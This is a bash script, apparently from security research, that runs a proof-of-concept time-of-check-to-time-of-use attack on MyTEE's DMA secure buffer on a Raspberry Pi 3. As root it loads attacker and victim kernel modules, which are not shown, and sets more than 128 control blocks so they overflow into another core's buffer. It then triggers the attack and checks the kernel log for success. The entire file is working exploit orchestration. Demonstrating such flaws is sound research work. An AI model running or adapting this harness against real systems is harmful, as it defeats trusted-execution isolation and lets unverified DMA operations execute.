#!/bin/bash
#
# MyTEE TOCTOU Attack Demonstration Script
#
# This script demonstrates the TOCTOU vulnerability in MyTEE's DMA
# secure buffer implementation. The attack exploits the lack of
# core isolation when CB count exceeds 128.
#
# Prerequisites:
# - Both toctou_attacker.ko and toctou_victim.ko must be built
# - Must run as root
# - System must have 4 cores (Raspberry Pi 3)

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ATTACKER_MODULE="toctou_attacker.ko"
VICTIM_MODULE="toctou_victim.ko"

# Number of CBs (must be > 128 for overflow)
CB_COUNT=${1:-129}

echo -e "${BLUE}============================================${NC}"
echo -e "${BLUE}   MyTEE TOCTOU Attack Demonstration${NC}"
echo -e "${BLUE}============================================${NC}"
echo ""

# Check root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Error: Must run as root${NC}"
    exit 1
fi

# Check modules exist
if [ ! -f "$SCRIPT_DIR/$ATTACKER_MODULE" ]; then
    echo -e "${RED}Error: $ATTACKER_MODULE not found. Run 'make' first.${NC}"
    exit 1
fi

if [ ! -f "$SCRIPT_DIR/$VICTIM_MODULE" ]; then
    echo -e "${RED}Error: $VICTIM_MODULE not found. Run 'make' first.${NC}"
    exit 1
fi

# Cleanup function
cleanup() {
    echo -e "\n${YELLOW}Cleaning up...${NC}"
    rmmod toctou_victim 2>/dev/null || true
    rmmod toctou_attacker 2>/dev/null || true
    echo -e "${GREEN}Cleanup complete${NC}"
}

trap cleanup EXIT

echo -e "${YELLOW}Attack Configuration:${NC}"
echo "  - Control Block count: $CB_COUNT"
echo "  - Max CBs per core buffer: 128"
echo "  - Overflow amount: $((CB_COUNT - 128)) CBs"
echo ""

# Step 1: Load attacker module on Core 1
echo -e "${GREEN}[Step 1] Loading attacker module (runs on Core 1)...${NC}"
insmod "$SCRIPT_DIR/$ATTACKER_MODULE" debug=1
sleep 1

echo -e "${GREEN}[Step 2] Loading victim module (runs on Core 0)...${NC}"
insmod "$SCRIPT_DIR/$VICTIM_MODULE" cb_count=$CB_COUNT debug=1
sleep 1

echo ""
echo -e "${YELLOW}Modules loaded. Current state:${NC}"
lsmod | grep toctou || true
echo ""

echo -e "${BLUE}--- Pre-attack kernel log ---${NC}"
dmesg | tail -30
echo -e "${BLUE}-----------------------------${NC}"
echo ""

echo -e "${YELLOW}Attack Scenario:${NC}"
echo "  1. Core 0 (victim) will request DMA with $CB_COUNT control blocks"
echo "  2. Hypervisor copies CBs to Core 0's secure buffer"
echo "  3. CB[128+] overflows into Core 1's buffer region"
echo "  4. Core 1 (attacker) injects malicious CB into its buffer"
echo "  5. DMA follows chain and executes UNVERIFIED CB[128+]"
echo ""

read -p "Press ENTER to trigger the attack..."

echo ""
echo -e "${RED}[Step 3] TRIGGERING ATTACK!${NC}"
echo 1 > /sys/module/toctou_victim/parameters/trigger

# Wait for attack to complete
sleep 2

echo ""
echo -e "${BLUE}--- Post-attack kernel log ---${NC}"
dmesg | tail -50
echo -e "${BLUE}------------------------------${NC}"
echo ""

# Check for attack success indicators
if dmesg | grep -q "ATTACK SUCCESS"; then
    echo -e "${RED}╔════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║         TOCTOU ATTACK SUCCESSFUL!          ║${NC}"
    echo -e "${RED}╠════════════════════════════════════════════╣${NC}"
    echo -e "${RED}║  DMA executed unverified control blocks    ║${NC}"
    echo -e "${RED}║  from Core 1's buffer region.              ║${NC}"
    echo -e "${RED}║                                            ║${NC}"
    echo -e "${RED}║  This proves the lack of core isolation    ║${NC}"
    echo -e "${RED}║  in MyTEE's DMA secure buffer.             ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════════╝${NC}"
else
    echo -e "${YELLOW}Attack sequence completed. Check dmesg for details.${NC}"
fi

echo ""
echo -e "${YELLOW}Attack demonstration complete.${NC}"
echo "Press ENTER to unload modules and exit..."
read

exit 0
